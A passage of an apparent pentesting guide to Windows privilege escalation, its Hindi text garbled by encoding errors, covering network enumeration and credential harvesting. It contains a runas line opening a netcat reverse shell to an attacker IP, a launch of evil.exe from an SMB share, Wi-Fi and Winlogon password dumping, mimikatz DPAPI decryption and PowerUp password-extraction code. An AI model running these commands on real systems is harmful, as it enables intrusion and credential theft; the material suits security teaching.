net share #Check current shares
```
### рд╣реЛрд╕реНрдЯреНрд╕ рдлрд╝рд╛рдЗрд▓

рд╣реЛрд╕реНрдЯреНрд╕ рдлрд╝рд╛рдЗрд▓ рдкрд░ рд╣рд╛рд░реНрдбрдХреЛрдб рдХрд┐рдП рдЧрдП рдЕрдиреНрдп рдЬреНрдЮрд╛рдд рдХрдВрдкреНрдпреВрдЯрд░реЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ
```
type C:\Windows\System32\drivers\etc\hosts
```
### рдиреЗрдЯрд╡рд░реНрдХ рдЗрдВрдЯрд░рдлреЗрд╕ рдФрд░ DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### рдУрдкрди рдкреЛрд░реНрдЯреНрд╕

рдмрд╛рд╣рд░ рд╕реЗ **рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рд╕реЗрд╡рд╛рдПрдВ** рдЬрд╛рдВрдЪреЗрдВ
```bash
netstat -ano #Opened ports?
```
### рд░реВрдЯрд┐рдВрдЧ рддрд╛рд▓рд┐рдХрд╛
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP рддрд╛рд▓рд┐рдХрд╛
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рдирд┐рдпрдо

[**рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рд╕рдВрдмрдВрдзрд┐рдд рдХрдорд╛рдВрдбреНрд╕ рдХреЗ рд▓рд┐рдП рдЗрд╕ рдкреЗрдЬ рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ**](../basic-cmd-for-pentesters.md#firewall) **(рдирд┐рдпрдо рд╕реВрдЪреА, рдирд┐рдпрдо рдмрдирд╛рдПрдВ, рдмрдВрдж рдХрд░реЗрдВ, рдмрдВрдж рдХрд░реЗрдВ...)**

рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ рдЬрд╛рдВрдЪ рдХреЗ рд▓рд┐рдП [рдпрд╣рд╛рдБ рдЕрдзрд┐рдХ рдХрдорд╛рдВрдбреНрд╕](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
рдмрд╛рдЗрдирд░реА `bash.exe` рдХреЛ `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` рдореЗрдВ рднреА рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЕрдЧрд░ рдЖрдк рд░реВрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдЖрдк рдХрд┐рд╕реА рднреА рдкреЛрд░реНрдЯ рдкрд░ рд╕реБрди рд╕рдХрддреЗ рд╣реИрдВ (`nc.exe` рдХрд╛ рдкреНрд░рдердо рдмрд╛рд░ рдкреЛрд░реНрдЯ рдкрд░ рд╕реБрдирдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдкрд░ рдпрд╣ рдлрд╛рдпрд░рд╡реЙрд▓ рджреНрд╡рд╛рд░рд╛ рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП GUI рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреВрдЫреЗрдЧрд╛)ред
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
рдмреИрд╢ рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рд╢реБрд░реВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк `--default-user root` рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЖрдк `WSL` рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдЗрд╕ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреЛ рд╕рд░реНрд╡рд░, рд╡реЗрдмрд╕рд╛рдЗрдЯ рдФрд░ рдЕрдиреНрдп рдХрд╛рд░реНрдпрдХреНрд░рдореЛрдВ рдХреЗ рд▓рд┐рдП рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ **Windows** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ **рд╕реНрд╡рддрдГ рд▓реЙрдЧ рдЗрди рдХрд░рдиреЗ** рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИред рдкрд╣рд▓реА рджреГрд╖реНрдЯрд┐ рдореЗрдВ, рдпрд╣ рдРрд╕рд╛ рджрд┐рдЦ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЕрдм рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдкрдиреЗ Facebook рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓, Twitter рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓, Gmail рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдЖрджрд┐ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддрд╛рдХрд┐ рд╡реЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд▓реЙрдЧ рдЗрди рдХрд░реЗрдВред рд▓реЗрдХрд┐рди рдРрд╕рд╛ рдирд╣реАрдВ рд╣реИред

Windows Vault рдЙрди рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреЛ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ Windows рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╕реНрд╡рддрдГ рд▓реЙрдЧ рдЗрди рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдХрд┐рд╕реА рднреА **Windows рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЬреЛ рдХрд┐рд╕реА рд╕рдВрд╕рд╛рдзрди (рд╕рд░реНрд╡рд░ рдпрд╛ рд╡реЗрдмрд╕рд╛рдЗрдЯ) рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ**, **рдЗрд╕ Credential Manager** рдФрд░ Windows Vault рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкреНрд░рд╡реЗрд╢ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдмрд╛рд░-рдмрд╛рд░ рджрд░реНрдЬ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреАред

рдпрджрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди Credential Manager рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░рдирд╛ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдореБрдЭреЗ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдЙрд╕реЗ рджрд┐рдП рдЧрдП рд╕рдВрд╕рд╛рдзрди рдХреЗ рд▓рд┐рдП рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдкрдХреА рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╡реЙрд▓реНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддреА рд╣реИ, рддреЛ рдЙрд╕реЗ рдХрд┐рд╕реА рдкреНрд░рдХрд╛рд░ рд╕реЗ **рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдореИрдиреЗрдЬрд░ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдФрд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реНрдЯреЛрд░реЗрдЬ рд╡реЙрд▓реНрдЯ рд╕реЗ рдЙрд╕ рд╕рдВрд╕рд╛рдзрди рдХреЗ рд▓рд┐рдП рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред**

рдорд╢реАрди рдкрд░ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреА рд╕реВрдЪреА рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП `cmdkey` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
рддреЛ рдЖрдк `runas` рдХрд╛ рдЙрдкрдпреЛрдЧ `/savecred` рд╡рд┐рдХрд▓реНрдк рдХреЗ рд╕рд╛рде рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╕рд╣реЗрдЬреЗ рдЧрдП рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдПрдХ SMB рд╕реЗрдпрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рд░рд┐рдореЛрдЯ рдмрд╛рдЗрдирд░реА рдХреЛ рдХреЙрд▓ рдХрд░ рд░рд╣рд╛ рд╣реИред
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
рдПрдХ рдкреНрд░рджрддреНрдд рд╕реЗрдЯ рдХреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреЗ рд╕рд╛рде `runas` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
рдХреГрдкрдпрд╛ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials\_file\_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault\_password\_view.html), рдпрд╛ [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/dumpCredStore.ps1) рд╕реЗ рднреА рд▓рд╛рдн рдЙрдард╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### DPAPI

**рдбреЗрдЯрд╛ рд╕рдВрд░рдХреНрд╖рдг API (DPAPI)** рдбреЗрдЯрд╛ рдХрд╛ рд╕рдордорд┐рдд рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд┐рдзрд┐ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рдЕрдзрд┐рдХрд╛рдВрд╢ рд░реВрдк рд╕реЗ рдПрд╕рд┐рдореЗрдЯреНрд░рд┐рдХ рдирд┐рдЬреА рдХреБрдВрдЬреАрдпреЛрдВ рдХреЗ рд▓рд┐рдП рд╡рд┐рдВрдбреЛрдЬ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рднреАрддрд░ рдкреНрд░рдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдпрд╛ рд╕рд┐рд╕реНрдЯрдо рд░рд╣рд╕реНрдп рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдЕрдВрддрд░реНрд╡рд┐рд╖реНрдЯрд┐ рдореЗрдВ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдпреЛрдЧрджрд╛рди рджреЗрддрд╛ рд╣реИред

**DPAPI рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓реЙрдЧрд┐рди рд░рд╣рд╕реНрдп рд╕реЗ рдЙрддреНрдкрдиреНрди рдПрдХ рд╕рдордорд┐рдд рдХреБрдВрдЬреА рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреБрдВрдЬрд┐рдпреЛрдВ рдХрд╛ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рд╕рдВрднрд╡ рдмрдирд╛рддрд╛ рд╣реИ**ред рд╕рд┐рд╕реНрдЯрдо рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдкрд░рд┐рджреГрд╢реНрдпреЛрдВ рдореЗрдВ, рдпрд╣ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдбреЛрдореЗрди рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд░рд╣рд╕реНрдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред

DPAPI рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ RSA рдХреБрдВрдЬреА DPAPI рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ `%APPDATA%\Microsoft\Protect\{SID}` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХреА рдЬрд╛рддреА рд╣реИ, рдЬрд╣рд╛рдВ `{SID}` рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ [рд╕реБрд░рдХреНрд╖рд╛ рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛](https://en.wikipedia.org/wiki/Security\_Identifier) рдХрд╛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХрд░рддрд╛ рд╣реИред **DPAPI рдХреБрдВрдЬреА, рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдирд┐рдЬреА рдХреБрдВрдЬрд┐рдпреЛрдВ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░рдЦрдиреЗ рд╡рд╛рд▓реА рдорд╛рд╕реНрдЯрд░ рдХреБрдВрдЬреА рдХреЗ рд╕рд╛рде рд╕рд╣рдпреЛрдЧреА рд░реВрдк рд╕реЗ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рд╣реИ**, рд╕рд╛рдорд╛рдиреНрдпрдд: 64 рдмрд╛рдЗрдЯ рдХреЗ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдбреЗрдЯрд╛ рд╕реЗ рдмрдиреА рд╣реЛрддреА рд╣реИред (рдЗрд╕ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рддрдХ рдкрд╣реБрдВрдЪ рдХреЛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ, рдЬрд┐рд╕рд╕реЗ `CMD` рдореЗрдВ `dir` рдХрдорд╛рдВрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЗрд╕рдХреА рд╕рд╛рдордЧреНрд░реА рдХреА рд╕реВрдЪреАрдХрд░рдг рдирд╣реАрдВ рд╣реЛ рд╕рдХрддреА, рд╣рд╛рд▓рд╛рдВрдХрд┐ рдпрд╣ рдкрд╛рд╡рд░рд╢реЗрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реВрдЪреАрдмрджреНрдз рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ)ред
```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
рдЖрдк **mimikatz рдореЙрдбреНрдпреВрд▓** `dpapi::masterkey` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд╕рд╣реА рддрд░реАрдХреЗ рд╕реЗ рддрд░реНрдХ (`/pvk` рдпрд╛ `/rpc`) рдХреЗ рд╕рд╛рде рдЗрд╕реЗ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

**рдорд╛рд╕реНрдЯрд░ рдкрд╛рд╕рд╡рд░реНрдб рджреНрд╡рд╛рд░рд╛ рд╕рдВрд░рдХреНрд╖рд┐рдд рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдлрд╝рд╛рдЗрд▓реЗрдВ** рдЖрдо рддреМрд░ рдкрд░ рдЗрд╕рдореЗрдВ рд╕реНрдерд┐рдд рд╣реЛрддреА рд╣реИрдВ:
```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
рдЖрдк **mimikatz рдореЙрдбреНрдпреВрд▓** `dpapi::cred` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЙрдкрдпреБрдХреНрдд `/masterkey` рдХреЗ рд╕рд╛рде рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред\
рдЖрдк `sekurlsa::dpapi` рдореЙрдбреНрдпреВрд▓ рдХреЗ рд╕рд╛рде **рдореЗрдореЛрд░реА** рд╕реЗ **рдХрдИ DPAPI рдорд╛рд╕реНрдЯрд░рдХреА** рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ (рдЕрдЧрд░ рдЖрдк рд░реВрдЯ рд╣реИрдВ)ред

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### PowerShell Credentials

**PowerShell credentials** рдЕрдХреНрд╕рд░ **рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ** рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рди рдХрд╛рд░реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреЛ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рд░реВрдк рд╕реЗ рд╕реНрдЯреЛрд░ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ **DPAPI** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реБрд░рдХреНрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЙрдиреНрд╣реЗрдВ рд╕рд╛рдорд╛рдиреНрдпрдд: рдХреЗрд╡рд▓ рдЙрд╕реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдЙрд╕реА рдХрдВрдкреНрдпреВрдЯрд░ рдкрд░ рдЬрд┐рдиреНрд╣реЗрдВ рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рдерд╛, рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕реЗ PS рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### рд╡рд╛рдИрдлрд╛рдИ
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### рд╕рд╣реЗрдЬреА рдЧрдИ RDP рдХрдиреЗрдХреНрд╢рди

рдЖрдк рдЙрдиреНрд╣реЗрдВ `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\` рдкрд░ рдвреВрдВрдв рд╕рдХрддреЗ рд╣реИрдВ\
рдФрд░ `HKCU\Software\Microsoft\Terminal Server Client\Servers\` рдореЗрдВред

### рд╣рд╛рд▓ рд╣реА рдореЗрдВ рдЪрд▓рд╛рдП рдЧрдП рдХрдорд╛рдВрдб
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **рд░рд┐рдореЛрдЯ рдбреЗрд╕реНрдХрдЯреЙрдк рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдореИрдиреЗрдЬрд░**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
**Mimikatz** рдХреЗ `dpapi::rdg` рдореЙрдбреНрдпреВрд▓ рдХрд╛ рдЙрдкрдпреБрдХреНрдд `/masterkey` рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ **.rdg рдлрд╝рд╛рдЗрд▓реЛрдВ** рдХреЛ **рдбрд┐рдХреНрд░рд┐рдкреНрдЯ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред\
рдЖрдк **Mimikatz** рдХреЗ `sekurlsa::dpapi` рдореЙрдбреНрдпреВрд▓ рдХреЗ рд╕рд╛рде рдореЗрдореЛрд░реА рд╕реЗ **рдХрдИ DPAPI рдорд╛рд╕реНрдЯрд░рдХреА** рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВред

### рд╕реНрдЯрд┐рдХреА рдиреЛрдЯреНрд╕

рд▓реЛрдЧ рдЕрдХреНрд╕рд░ рд╕реНрдЯрд┐рдХреА рдиреЛрдЯреНрд╕ рдРрдк рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ Windows рдХрд╛рд░реНрдпрд╕реНрдерд▓реЛрдВ рдкрд░ **рдкрд╛рд╕рд╡рд░реНрдб** рдФрд░ рдЕрдиреНрдп рдЬрд╛рдирдХрд╛рд░реА рд╕рд╣реЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП, рдпрд╣ рдПрдХ рдбреЗрдЯрд╛рдмреЗрд╕ рдлрд╝рд╛рдЗрд▓ рд╣реИ рдЬрд┐рд╕реЗ `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` рдкрд░ рд╕реНрдерд┐рдд рд╣реИ рдФрд░ рд╣рдореЗрд╢рд╛ рдЦреЛрдЬрдиреЗ рдФрд░ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд╛рдпрдХ рд╣реИред

### AppCmd.exe

**рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ AppCmd.exe рд╕реЗ рдкрд╛рд╕рд╡рд░реНрдб рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдФрд░ рдЙрдЪреНрдЪ рдЕрднрд┐рдпрд╛рдВрддреНрд░рд┐рдХ рд╕реНрддрд░ рдХреЗ рддрд╣рдд рдЪрд▓рд╛рдирд╛ рд╣реЛрдЧрд╛ред**\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд╕реНрдерд┐рдд рд╣реИред\
рдпрджрд┐ рдпрд╣ рдлрд╝рд╛рдЗрд▓ рдореМрдЬреВрдж рд╣реИ рддреЛ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рдХреБрдЫ **рдкреНрд░рдорд╛рдгрд┐рдХрд░рдг** рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рд╣реИрдВ рдФрд░ **рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрдд** рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдпрд╣ рдХреЛрдб [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) рд╕реЗ рдирд┐рдХрд╛рд▓рд╛ рдЧрдпрд╛ рдерд╛:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
